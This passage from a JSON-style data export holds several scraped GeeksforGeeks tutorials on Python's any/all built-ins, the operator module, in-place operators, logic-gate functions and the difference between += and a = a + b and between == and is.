    "text": "Any and All are two built ins provided in python used for successive And/Or.AnyReturns true if any of the items is True. It returns False if empty or all are false. Any can be thought of as a sequence of OR operations on the provided iterables.It short circuit the execution i.e. stop the execution as soon as the result is known.Syntax : any(list of iterables)# Since all are false, false is returnedprint (any([False, False, False, False]))\u00a0\u00a0# Here the method will short-circuit at the# second item (True) and will return True.print (any([False, True, False, False]))\u00a0\u00a0# Here the method will short-circuit at the# first (True) and will return True.print (any([True, False, False, False]))Output :\r\nFalse\r\nTrue\r\nTrue\r\n\u00a0AllReturns true if all of the items are True (or if the iterable is empty). All can be thought of as a sequence of AND operations on the provided iterables. It also short circuit the execution i.e. stop the execution as soon as the result is known.Syntax : all(list of iterables)# Here all the iterables are True so all# will return True and the same will be printedprint (all([True, True, True, True]))\u00a0\u00a0# Here the method will short-circuit at the\u00a0# first item (False) and will return False.print (all([False, True, True, False]))\u00a0\u00a0# This statement will return False, as no# True is found in the iterablesprint (all([False, False, False]))Output :\r\nTrue\r\nFalse\r\nFalse\r\nPractical Examples# This code explains how can we\u00a0# use 'any' function on list\u00a0list1 = []list2 = []\u00a0\u00a0# Index ranges from 1 to 10 to multiplyfor i in range(1,11):\u00a0\u00a0\u00a0\u00a0list1.append(4*i)\u00a0\u00a0\u00a0# Index to access the list2 is from 0 to 9for i in range(0,10):\u00a0\u00a0\u00a0\u00a0list2.append(list1[i]%5==0)\u00a0\u00a0print('See whether at least one number is divisible by 5 in list 1=>')print(any(list2))Output:\r\nSee whether at least one number is divisible by 5 in list 1=>\r\nTrue\r\n# Illustration of 'all' function in python 3\u00a0\u00a0# Take two lists\u00a0list1=[]list2=[]\u00a0\u00a0# All numbers in list1 are in form: 4*i-3for i\u00a0 in range(1,21):\u00a0\u00a0\u00a0\u00a0list1.append(4*i-3)\u00a0\u00a0# list2 stores info of odd numbers in list1for i in range(0,20):\u00a0\u00a0\u00a0\u00a0list2.append(list1[i]%2==1)\u00a0\u00a0print('See whether all numbers in list1 are odd =>')print(all(list2))Output:\r\nSee whether all numbers in list1 are odd =>\r\nTrue\r\nTruth table :-This article is contributed by Mayank Rawat .If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "e17107c40ff1863fa2e96ba71e147f0b",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Inplace Operators \u2013 Set 1, Set 2Normal operators do the simple assigning job. On other hand, Inplace operators behave similarly to normal operators except that they act in a different manner in case of mutable and Immutable targets.\u00a0\u00a0The _add_ method, does simple addition, takes two arguments, returns the sum, and stores it in another variable without modifying any of the arguments.On the other hand, _iadd_ method also takes two arguments, but it makes an in-place change in 1st argument passed by storing the sum in it. As object mutation is needed in this process, immutable targets such as numbers, strings, and tuples, shouldn\u2019t have _iadd_ method.Normal operator\u2019s \u201cadd()\u201d method, implements \u201ca+b\u201d and stores the result in the mentioned variable.Inplace operator\u2019s \u201ciadd()\u201d method, implements \u201ca+=b\u201d if it exists (i.e in case of immutable targets, it doesn\u2019t exist) and changes the value of the passed argument. But if not, \u201ca+b\u201d is implemented.Case 1: Immutable Targets.\u00a0In Immutable targets, such as numbers, strings, and tuples. Inplace operators behave the same as normal operators, i.e only assignment takes place, no modification is taken place in the passed arguments.\u00a0Python# Python code to demonstrate difference between\u00a0# Inplace and Normal operators in Immutable Targets\u00a0\u00a0# importing operator to handle operator operationsimport operator\u00a0\u00a0# Initializing valuesx = 5y = 6a = 5b = 6\u00a0\u00a0# using add() to add the arguments passed\u00a0z = operator.add(a,b)\u00a0\u00a0# using iadd() to add the arguments passed\u00a0p = operator.iadd(x,y)\u00a0\u00a0# printing the modified valueprint (\"Value after adding using normal operator : \",end=\"\")print (z)\u00a0\u00a0# printing the modified valueprint (\"Value after adding using Inplace operator : \",end=\"\")print (p)\u00a0\u00a0# printing value of first argument# value is unchangedprint (\"Value of first argument using normal operator : \",end=\"\")print (a)\u00a0\u00a0# printing value of first argument# value is unchangedprint (\"Value of first argument using Inplace operator : \",end=\"\")print (x)Output:Value after adding using normal operator : 11\r\nValue after adding using Inplace operator : 11\r\nValue of first argument using normal operator : 5\r\nValue of first argument using Inplace operator : 5Case 2: Mutable Targets\u00a0The behavior of Inplace operators in mutable targets, such as lists and dictionaries, is different from normal operators. The updation and assignment both are carried out in case of mutable targets.\u00a0Python# Python code to demonstrate difference between\u00a0# Inplace and Normal operators in mutable Targets\u00a0\u00a0# importing operator to handle operator operationsimport operator\u00a0\u00a0# Initializing lista = [1, 2, 4, 5]\u00a0\u00a0# using add() to add the arguments passed\u00a0z = operator.add(a,[1, 2, 3])\u00a0\u00a0# printing the modified valueprint (\"Value after adding using normal operator : \",end=\"\")print (z)\u00a0\u00a0# printing value of first argument# value is unchangedprint (\"Value of first argument using normal operator : \",end=\"\")print (a)\u00a0\u00a0# using iadd() to add the arguments passed\u00a0# performs a+=[1, 2, 3]p = operator.iadd(a,[1, 2, 3])\u00a0\u00a0# printing the modified valueprint (\"Value after adding using Inplace operator : \",end=\"\")print (p)\u00a0\u00a0# printing value of first argument# value is changedprint (\"Value of first argument using Inplace operator : \",end=\"\")print (a)Output:\u00a0\u00a0Value after adding using normal operator : [1, 2, 4, 5, 1, 2, 3]\r\nValue of first argument using normal operator : [1, 2, 4, 5]\r\nValue after adding using Inplace operator : [1, 2, 4, 5, 1, 2, 3]\r\nValue of first argument using Inplace operator : [1, 2, 4, 5, 1, 2, 3]This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "1b81bc36686cd0e0a4e37658da0e3dad",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python has predefined functions for many mathematical, logical, relational, bitwise etc operations under the module \u201coperator\u201d. Some of the basic functions are covered in this article.1. add(a, b) :- This functions returns addition of the given arguments.Operation \u2013 a + b.2. sub(a, b) :- This functions returns difference of the given arguments.Operation \u2013 a \u2013 b.3. mul(a, b) :- This functions returns product of the given arguments.Operation \u2013 a * b.# Python code to demonstrate working of\u00a0# add(), sub(), mul()\u00a0\u00a0# importing operator module\u00a0import operator\u00a0\u00a0# Initializing variablesa = 4\u00a0\u00a0b = 3\u00a0\u00a0# using add() to add two numbersprint (\"The addition of numbers is :\",end=\"\");print (operator.add(a, b))\u00a0\u00a0# using sub() to subtract two numbersprint (\"The difference of numbers is :\",end=\"\");print (operator.sub(a, b))\u00a0\u00a0# using mul() to multiply two numbersprint (\"The product of numbers is :\",end=\"\");print (operator.mul(a, b))Output:\r\nThe addition of numbers is:7\r\nThe difference of numbers is :1\r\nThe product of numbers is:12\r\n4. truediv(a,b) :- This function returns division of the given arguments.Operation \u2013 a / b.5. floordiv(a,b) :- This function also returns division of the given arguments. But the value is floored value i.e. returns greatest small integer.Operation \u2013 a // b.6. pow(a,b) :- This function returns exponentiation of the given arguments.Operation \u2013 a ** b.7. mod(a,b) :- This function returns modulus of the given arguments.Operation \u2013 a % b.# Python code to demonstrate working of\u00a0# truediv(), floordiv(), pow(), mod()\u00a0\u00a0# importing operator module\u00a0import operator\u00a0\u00a0# Initializing variablesa = 5\u00a0\u00a0b = 2\u00a0\u00a0# using truediv() to divide two numbersprint (\"The true division of numbers is : \",end=\"\");print (operator.truediv(a,b))\u00a0\u00a0# using floordiv() to divide two numbersprint (\"The floor division of numbers is : \",end=\"\");print (operator.floordiv(a,b))\u00a0\u00a0# using pow() to exponentiate two numbersprint (\"The exponentiation of numbers is : \",end=\"\");print (operator.pow(a,b))\u00a0\u00a0# using mod() to take modulus of two numbersprint (\"The modulus of numbers is : \",end=\"\");print (operator.mod(a,b))Output:\r\nThe true division of numbers is: 2.5\r\nThe floor division of numbers is: 2\r\nThe exponentiation of numbers is: 25\r\nThe modulus of numbers is: 1\r\n8. lt(a, b) :- This function is used to check if a is less than b or not. Returns true if a is less than b, else returns false.Operation \u2013 a < b.9. le(a, b) :- This function is used to check if a is less than or equal to b or not. Returns true if a is less than or equal to b, else returns false.Operation \u2013 a <= b.10. eq(a, b) :- This function is used to check if a is equal to b or not. Returns true if a is equal to b, else returns false.Operation \u2013 a == b.# Python code to demonstrate working of\u00a0# lt(), le() and eq()\u00a0\u00a0# importing operator module\u00a0import operator\u00a0\u00a0# Initializing variablesa = 3\u00a0\u00a0b = 3\u00a0\u00a0# using lt() to check if a is less than bif(operator.lt(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"3 is less than 3\")else : print (\"3 is not less than 3\")\u00a0\u00a0# using le() to check if a is less than or equal to bif(operator.le(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"3 is less than or equal to 3\")else : print (\"3 is not less than or equal to 3\")\u00a0\u00a0# using eq() to check if a is equal to bif (operator.eq(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"3 is equal to 3\")else : print (\"3 is not equal to 3\")Output:\r\n3 is not less than 3\r\n3 is less than or equal to 3\r\n3 is equal to 3\r\n11. gt(a,b) :- This function is used to check if a is greater than b or not. Returns true if a is greater than b, else returns false.Operation \u2013 a > b.12. ge(a,b) :- This function is used to check if a is greater than or equal to b or not. Returns true if a is greater than or equal to b, else returns false.Operation \u2013 a >= b.13. ne(a,b) :- This function is used to check if a is not equal to b or is equal. Returns true if a is not equal to b, else returns false.Operation \u2013 a != b.# Python code to demonstrate working of\u00a0# gt(), ge() and ne()\u00a0\u00a0# importing operator module\u00a0import operator\u00a0\u00a0# Initializing variablesa = 4\u00a0\u00a0b = 3\u00a0\u00a0# using gt() to check if a is greater than bif (operator.gt(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"4 is greater than 3\")else : print (\"4 is not greater than 3\")\u00a0\u00a0# using ge() to check if a is greater than or equal to bif (operator.ge(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"4 is greater than or equal to 3\")else : print (\"4 is not greater than or equal to 3\")\u00a0\u00a0# using ne() to check if a is not equal to bif (operator.ne(a,b)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print (\"4 is not equal to 3\")else : print (\"4 is equal to 3\")Output:\r\n4 is greater than 3\r\n4 is greater than or equal to 3\r\n4 is not equal to 3\r\nThis article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d3df200999de4258ade45e6a93f1aa19",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python in its definition provides methods to perform inplace operations, i.e doing assignment and computation in a single statement using \u201coperator\u201d module. For example,x += y is equivalent to x = operator.iadd(x, y) Some Important Inplace operations :1. iadd() :- This function is used to assign and add the current value. This operation does \u201ca+=b\u201d operation. Assigning is not performed in case of immutable containers, such as strings, numbers and tuples.2. iconcat() :- This function is used to concat one string at end of second.# Python code to demonstrate the working of\u00a0# iadd() and iconcat()\u00a0\u00a0# importing operator to handle operator operationsimport operator\u00a0\u00a0# using iadd() to add and assign valuex = operator.iadd(2, 3);\u00a0\u00a0# printing the modified valueprint (\"The value after adding and assigning : \", end=\"\")print (x)\u00a0\u00a0# initializing valuesy = \"geeks\"\u00a0\u00a0z = \"forgeeks\"\u00a0\u00a0# using iconcat() to concat the sequencesy = operator.iconcat(y, z)\u00a0\u00a0# using iconcat() to concat sequences\u00a0print (\"The string after concatenation is : \", end=\"\")print (y)Output:The value after adding and assigning : 5\r\nThe string after concatenation is : geeksforgeeks\r\n3. isub() :- This function is used to assign and subtract the current value. This operation does \u201ca-=b\u201d operation. Assigning is not performed in case of immutable containers, such as strings, numbers and tuples.4. imul() :- This function is used to assign and multiply the current value. This operation does \u201ca*=b\u201d operation. Assigning is not performed in case of immutable containers, such as strings, numbers and tuples.# Python code to demonstrate the working of\u00a0# isub() and imul()\u00a0\u00a0# importing operator to handle operator operationsimport operator\u00a0\u00a0# using isub() to subtract and assign valuex = operator.isub(2, 3);\u00a0\u00a0# printing the modified valueprint (\"The value after subtracting and assigning : \", end=\"\")print (x)\u00a0\u00a0# using imul() to multiply and assign valuex = operator.imul(2, 3);\u00a0\u00a0# printing the modified valueprint (\"The value after multiplying and assigning : \", end=\"\")print (x)Output:The value after subtracting and assigning : -1\r\nThe value after multiplying and assigning : 6\r\n5. itruediv() :- This function is used to assign and divide the current value. This operation does \u201ca/=b\u201d operation. Assigning is not performed in case of immutable containers, such as strings, numbers and tuples.6. imod() :- This function is used to assign and return remainder . This operation does \u201ca%=b\u201d operation. Assigning is not performed in case of immutable containers, such as strings, numbers and tuples.# Python code to demonstrate the working of\u00a0# itruediv() and imod()\u00a0\u00a0# importing operator to handle operator operationsimport operator\u00a0\u00a0# using itruediv() to divide and assign valuex = operator.itruediv(10, 5);\u00a0\u00a0# printing the modified valueprint (\"The value after dividing and assigning : \", end=\"\")print (x)\u00a0\u00a0# using imod() to modulus and assign valuex = operator.imod(10, 6);\u00a0\u00a0# printing the modified valueprint (\"The value after modulus and assigning : \", end=\"\")print (x)Output:The value after dividing and assigning : 2.0\r\nThe value after modulus and assigning : 4\r\nNext ArticlesInplace Operators in Python | Set 2Inplace vs Standard OperatorsThis article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "86a9727ca11a5e47cc89fa4d21391e76",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Logic gates are elementary building blocks for any digital circuits. It takes one or two inputs and produces output based on those inputs. Outputs may be high (1) or low (0). Logic gates are implemented using diodes or transistors. It can also be constructed using vacuum tubes, electromagnetic elements like optics, molecules, etc. In a computer, most of the electronic circuits are made up of logic gates. Logic gates are used to circuits that perform calculations, data storage, or show off object-oriented programming especially the power of inheritance.\u00a0\u00a0There are seven basic logic gates defined are: AND gate, OR gate, NOT gate, NAND gate, NOR gate, XOR gate, an XNOR gate.\u00a0\u00a01. AND Gate\u00a0The AND gate gives an output of 1 if both the two inputs are 1, it gives 0 otherwise.\u00a0\u00a0Python3# Python3 program to illustrate# working of AND gate\u00a0def AND (a, b):\u00a0\u00a0\u00a0\u00a0\u00a0if a == 1 and b == 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(AND(1, 1))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | AND Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A AND B =\",AND(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A AND B =\",AND(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A AND B =\",AND(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A AND B =\",AND(True,True),\" | \")Output:\u00a0\u00a0True\n+---------------+----------------\n | AND Truth Table |    Result |\n A = False, B = False | A AND B = False  | \n A = False, B = True  | A AND B = False  | \n A = True, B = False  | A AND B = False  | \n A = True, B = True   | A AND B = True   | 2. NAND Gate\u00a0The NAND gate (negated AND) gives an output of 0 if both inputs are 1, it gives 1 otherwise.\u00a0\u00a0Python3# Python3 program to illustrate# working of NAND gate\u00a0def NAND (a, b):\u00a0\u00a0\u00a0\u00a0if a == 1 and b == 1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(NAND(1, 0))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | NAND Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A AND B =\",NAND(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A AND B =\",NAND(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A AND B =\",NAND(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A AND B =\",NAND(True,True),\" | \")Output:\u00a0\u00a0True\n+---------------+----------------\n | NAND Truth Table |    Result |\n A = False, B = False | A AND B = True  | \n A = False, B = True  | A AND B = True  | \n A = True, B = False  | A AND B = True  | \n A = True, B = True   | A AND B = False | \u00a0\u00a03. OR Gate\u00a0The OR gate gives an output of 1 if either of the two inputs are 1, it gives 0 otherwise.\u00a0\u00a0Python3# Python3 program to illustrate# working of OR gate\u00a0def OR(a, b):\u00a0\u00a0\u00a0\u00a0if a == 1 or b ==1:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return True\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return False\u00a0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(OR(0, 0))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | OR Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A OR B =\",OR(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A OR B =\",OR(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A OR B =\",OR(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A OR B =\",OR(True,True),\" | \")Output:\u00a0\u00a0False\n+---------------+----------------+\n | OR Truth Table |    Result |\n A = False, B = False | A OR B = False  | \n A = False, B = True  | A OR B = True   | \n A = True, B = False  | A OR B = True   | \n A = True, B = True   | A OR B = True   | \u00a0\u00a04. XOR Gate\u00a0The XOR gate gives an output of 1 if either of the inputs is different, it gives 0 if they are the same.\u00a0\u00a0\u00a0Python3# Python3 program to illustrate# working of Xor gate\u00a0def XOR (a, b):\u00a0\u00a0\u00a0\u00a0if a != b:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(XOR(5, 5))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | XOR Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A XOR B =\",XOR(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A XOR B =\",XOR(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A XOR B =\",XOR(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A XOR B =\",XOR(True,True),\" | \")Output:\u00a0\u00a00\n+---------------+----------------+\n | XOR Truth Table | Result |\n A = False, B = False | A XOR B = 0  | \n A = False, B = True  | A XOR B = 1  | \n A = True, B = False  | A XOR B = 1  | \n A = True, B = True   | A XOR B = 0  | \u00a0\u00a05. NOT Gate\u00a0It acts as an inverter. It takes only one input. If the input is given as 1, it will invert the result as 0 and vice-versa.\u00a0\u00a0\u00a0Python3# Python3 program to illustrate# working of Not gate\u00a0def NOT(a):\u00a0\u00a0\u00a0\u00a0return not a# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(NOT(0))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | NOT Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False | A NOT =\",NOT(False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, | A NOT =\",NOT(True),\" | \")\u00a0\u00a0Output:\u00a0\u00a01\n+---------------+----------------+\n | NOT Truth Table | Result |\n A = False | A NOT = 1  | \n A = True, | A NOT = 0  | \u00a0\u00a06. NOR Gate\u00a0The NOR gate (negated OR) gives an output of 1 if both inputs are 0, it gives 1 otherwise.\u00a0\u00a0\u00a0Python3# Python3 program to illustrate# working of NOR gate\u00a0def NOR(a, b):\u00a0\u00a0\u00a0\u00a0if(a == 0) and (b == 0):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0elif(a == 0) and (b == 1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0\u00a0\u00a0\u00a0elif(a == 1) and (b == 0):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0\u00a0\u00a0\u00a0elif(a == 1) and (b == 1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0\u00a0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(NOR(0, 0))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | NOR Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A NOR B =\",NOR(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A NOR B =\",NOR(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A NOR B =\",NOR(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A NOR B =\",NOR(True,True),\" | \")Output:\u00a0\u00a01\n+---------------+----------------+\n | NOR Truth Table |   Result |\n A = False, B = False | A NOR B = 1  | \n A = False, B = True  | A NOR B = 0  | \n A = True, B = False  | A NOR B = 0  | \n A = True, B = True   | A NOR B = 0  | \u00a0\u00a07. XNOR Gate\u00a0The XNOR gate (negated XOR) gives an output of 1 both inputs are same and 0 if both are different.\u00a0\u00a0\u00a0Python3# Python3 program to illustrate# working of Not gate\u00a0def XNOR(a,b):\u00a0\u00a0\u00a0\u00a0if(a == b):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0# Driver codeif __name__=='__main__':\u00a0\u00a0\u00a0\u00a0print(XNOR(1,1))\u00a0\u00a0\u00a0\u00a0\u00a0print(\"+---------------+----------------+\")\u00a0\u00a0\u00a0\u00a0print(\" | XNOR Truth Table | Result |\")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = False | A XNOR B =\",XNOR(False,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = False, B = True | A XNOR B =\",XNOR(False,True),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = False | A XNOR B =\",XNOR(True,False),\" | \")\u00a0\u00a0\u00a0\u00a0print(\" A = True, B = True | A XNOR B =\",XNOR(True,True),\" | \")Output:\u00a0\u00a01\n+---------------+----------------+\n | XNOR Truth Table |  Result |\n A = False, B = False | A XNOR B = 1  | \n A = False, B = True  | A XNOR B = 0  | \n A = True, B = False  | A XNOR B = 0  | \n A = True, B = True   | A XNOR B = 1  | \u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "9350bb24ed12a2e3b3f7819cbfe0b303",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In python a += b doesn\u2019t always behave the same way as a = a + b, the same operands may give different results under different conditions. But to understand why they show different behaviors you have to deep dive into the working of variables.So first, you need to know what happens behinds the scene.\u00a0Creating New Variable:Python3a = 10print(\" id of a : \", id(10) ,\" Value : \", a\u00a0 )Output :id of a :  11094592  Value :  10Here in the above example, value 10 gets stored in memory and its reference gets assigned to a.\u00a0Modifying The Variable:Python3a = 10\u00a0 # Assigning value to variable creats new objectprint(\" id of a : \", id(a) ,\" Value : \", a\u00a0 )\u00a0a = a + 10 # Modifying value of variable creats new objectprint(\" id of a : \", id(a) ,\" Value : \", a\u00a0 )\u00a0\u00a0\u00a0a += 10 # Modifying value of variable creats new objectprint(\" id of a : \", id(a) ,\" Value : \", a\u00a0 )Output :\u00a0id of a :  11094592  Value :  10\nid of a :  11094912  Value :  20\nid of a :  11095232  Value :  30As whenever we create or modify int, float, char, string they create new objects and assign their newly created reference to their respective variables.But the same behavior is not seen in the listPython3a = [0, 1] # stores this array in memory and assign its reference to aprint(\"id of a: \",id(a) , \"Value : \", a )\u00a0a = a + [2, 3] # this will also behave same store data in memory and assign ref. to variableprint(\"id of a: \",id(a) , \"Value : \", a )\u00a0a += [4, 5]print(\"id of a: \",id(a) , \"Value : \", a )\u00a0#But now this will now create new ref. instead this will modify the current object so# all the other variable pointing to a will also gets changes\u00a0Output:\u00a0id of a:  140266311673864 Value :  [0, 1]\nid of a:  140266311673608 Value :  [0, 1, 2, 3]\nid of a:  140266311673608 Value :  [0, 1, 2, 3, 4, 5]  At this point you can see the reason why a = a + b some times different from a += b.Consider these examples for list manipulation:\u00a0Example 1:\u00a0Python3list1 = [5, 4, 3, 2, 1]list2 = list1list1 += [1, 2, 3, 4] # modifying value in current reference\u00a0print(list1)print(list2) # as on line 4 it modify the value without creating new object\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# variable list2 which is pointing to list1 gets changesOutput:\u00a0[5, 4, 3, 2, 1, 1, 2, 3, 4]\n[5, 4, 3, 2, 1, 1, 2, 3, 4]Example 2\u00a0Python3list1 = [5, 4, 3, 2, 1]list2 = list1list1 = list1 + [1, 2, 3, 4]\u00a0# Contents of list1 are same as above# program, but contents of list2 are# different.print(list1)print(list2)Output:\u00a0[5, 4, 3, 2, 1, 1, 2, 3, 4]\n[5, 4, 3, 2, 1]\u00a0expression list1 += [1, 2, 3, 4] modifies the list in-place, which means it extends the list such that \u201clist1\u201d and \u201clist2\u201d still have the reference to the same list.expression list1 = list1 + [1, 2, 3, 4] creates a new list and changes \u201clist1\u201d reference to that new list and \u201clist2\u201d still refer to the old list.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "920aaa63847709dc93ba3ac699a6da6d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The Equality operator (==) compares the values of both the operands and checks for value equality. Whereas the \u2018is\u2019 operator checks whether both the operands refer to the same object or not (present in the same memory location).\u00a0Python3# python3 code to# illustrate the# difference between# == and is operator# [] is an empty listlist1 = []list2 = []list3=list1\u00a0if (list1 == list2):\u00a0\u00a0\u00a0\u00a0print(\"True\")else:\u00a0\u00a0\u00a0\u00a0print(\"False\")\u00a0if (list1 is list2):\u00a0\u00a0\u00a0\u00a0print(\"True\")else:\u00a0\u00a0\u00a0\u00a0print(\"False\")\u00a0if (list1 is list3):\u00a0\u00a0\u00a0\u00a0print(\"True\")else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"False\")\u00a0list3 = list3 + list2\u00a0if (list1 is list3):\u00a0\u00a0\u00a0\u00a0print(\"True\")else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"False\")Output:\u00a0True\nFalse\nTrue\nFalseThe output of the first if the condition is \u201cTrue\u201d as both list1 and list2 are empty lists.Second, if the condition shows \u201cFalse\u201d because two empty lists are at 